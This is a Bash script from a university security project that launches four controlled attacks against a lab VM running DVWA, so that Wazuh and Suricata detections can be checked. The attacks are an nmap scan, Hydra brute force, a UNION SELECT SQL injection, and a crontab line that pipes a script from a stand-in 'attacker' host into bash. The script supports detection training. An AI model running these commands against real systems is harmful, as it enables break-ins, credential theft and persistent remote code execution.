#!/usr/bin/env bash
# ==============================================================================
# 04_ataques.sh
# Mini-SOC TiendaCR — Proyecto 2 (ITI-922 Seguridad de TI II)
#
# Qué hace: lanza, uno por uno, los 4 ataques controlados usados en el proyecto
# desde la máquina atacante (Kali) contra vm-objetivo. Pide confirmación antes
# de cada ataque para poder observar la detección en el panel de Wazuh entre
# un ataque y el siguiente.
#
# Cómo usarlo (desde Kali):
#   chmod +x 04_ataques.sh
#   ./04_ataques.sh <IP_PUBLICA_VM_OBJETIVO>
#
# Ejemplo:
#   ./04_ataques.sh 20.123.45.67
# ==============================================================================
set -euo pipefail

TARGET="${1:?Falta la IP pública de vm-objetivo}"

pausa() {
  read -r -p "Presiona ENTER para continuar con: $1 "
}

echo "=============================================================="
echo " Ataque 1: Escaneo de puertos y servicios (Nmap) — T1046"
echo "=============================================================="
pausa "nmap -sV -sC"
nmap -sV -sC "$TARGET"

echo "=============================================================="
echo " Ataque 2: Fuerza bruta contra el login de DVWA (Hydra) — T1110"
echo " Detectado por: regla propia Suricata (sid:1000002) + reglas Wazuh 100100/100101"
echo " (dispara Active Response: bloqueo de esta IP durante 300s)"
echo "=============================================================="
pausa "hydra (fuerza bruta HTTP POST contra /login.php)"
hydra -l admin -P /usr/share/wordlists/rockyou.txt "$TARGET" http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4 -V

echo "=============================================================="
echo " Ataque 3: Inyección SQL — UNION SELECT (DVWA, módulo SQL Injection) — T1190"
echo " Detectado por: regla propia Suricata (sid:1000001)"
echo " NOTA: si el ataque 2 disparó el Active Response, la IP puede seguir"
echo " bloqueada hasta 300s. Verificar conectividad antes de continuar."
echo "=============================================================="
pausa "curl con UNION SELECT contra el módulo SQLi de DVWA"
curl -s "http://$TARGET/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit" \
  -H "Cookie: security=low; PHPSESSID=<reemplazar_por_sesion_valida>"

echo "=============================================================="
echo " Ataque 4: Persistencia vía cron (modificación de archivo) — T1053.003"
echo " Detectado por: Wazuh FIM (regla 554)"
echo " Este paso se corre DENTRO de vm-objetivo (requiere acceso SSH ya logrado)"
echo "=============================================================="
echo "Ejecutar manualmente en vm-objetivo:"
echo '  echo "* * * * * root curl http://attacker/payload.sh | bash" >> /etc/crontab'

echo "=============================================================="
echo "Listo. Revisar el panel de Wazuh (Threat Hunting) y las alertas de Suricata"
echo "(/var/log/suricata/eve.json en vm-objetivo) para confirmar cada detección."
echo "=============================================================="
